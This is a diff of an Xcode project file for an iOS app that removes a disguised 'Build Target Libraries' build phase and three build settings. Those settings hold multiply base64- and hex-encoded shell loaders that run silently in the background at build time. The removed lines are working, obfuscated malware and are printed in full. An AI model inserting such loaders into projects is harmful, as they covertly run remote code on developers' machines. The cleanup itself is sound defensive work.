@@ -66,7 +66,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-															/* End PBXBuildRule section */
+																									/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		CE96E2A72A31DBC200EFE49C /* PBXContainerItemProxy */ = {
@@ -443,7 +443,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = CE96E2BA2A31DBC200EFE49C /* Build configuration list for PBXNativeTarget "TongueScan_iOS" */;
 			buildPhases = (
-				DD2A5D76E0F047BDB9634D6E /* Build Target Libraries */,
 				21D5552F8E289BC0C03824B1 /* [CP] Check Pods Manifest.lock */,
 				CE96E2912A31DBC000EFE49C /* Sources */,
 				CE96E2922A31DBC000EFE49C /* Frameworks */,
@@ -572,25 +571,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		DD2A5D76E0F047BDB9634D6E /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
-		};
 		0B7163C5EB6207E34AB1D27C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -806,9 +786,6 @@
 		CE96E2B82A31DBC200EFE49C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSVRuZGpiVGt3WW5rMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | i | sh ) >/dev/null 2>&1 &)";
-				A45ED5A = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTVlJ1WkdsTk1IQXlXa1ZqTkdSWFJsaE9TRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | h | sh ) >/dev/null 2>&1 &)";
-				A6E983A = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373436333730366536353734326537323735326636313239323232300a376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -870,9 +847,6 @@
 		CE96E2B92A31DBC200EFE49C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSVRuZGpiVGt3WW5rMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | i | sh ) >/dev/null 2>&1 &)";
-				A45ED5A = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTVlJ1WkdsTk1IQXlXa1ZqTkdSWFJsaE9TRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | h | sh ) >/dev/null 2>&1 &)";
-				A6E983A = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373436333730366536353734326537323735326636313239323232300a376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
